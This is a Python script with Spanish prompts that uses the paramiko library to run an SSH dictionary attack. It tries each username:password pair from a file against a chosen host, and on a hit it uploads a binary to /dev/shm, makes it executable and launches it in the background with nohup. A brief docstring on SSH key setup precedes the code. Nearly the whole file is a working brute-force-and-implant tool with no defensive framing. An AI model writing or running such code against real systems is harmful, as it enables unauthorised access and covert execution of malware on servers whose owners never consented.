'''
public key authentication:
keys:
				ssh-keygen -t rsa
copiar claves al servidor:
				ssh-copy-id user@host
'''


import paramiko
from paramiko import RSAKey
import getpass, sys

host = input("Introduce el host: ")
dictionaryFile = input("Introduce el diccionario de usuarios y contraseñas, cada combinación separando usuario y pass por dos puntos. En el fichero debe haber una combinación por línea: ")

client = paramiko.SSHClient()
paramiko.util.log_to_file('paramiko.log')
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
sucess = False
for line in open(dictionaryFile, "r").readlines() :
	try:
		[username, password] = line.strip().split(":")
		print("[+] Trying: %s : %s " % (username, password))
		client.connect(host, username=username, password=password)
		print("[+] Username: %s with password %s is valid! exiting..." %(username,password))
		sucess = True
		break
	except paramiko.AuthenticationException:
		continue 

if sucess:
	sftp = client.open_sftp()
	fileName  = input("Introduce el binario que quieres subir: ")
	sftp.put(fileName, "/dev/shm/" +fileName)
	client.exec_command("chmod a+x /dev/shm/" +fileName)
	client.exec_command("nohup /dev/shm/" +fileName+ " &")
	client.close()
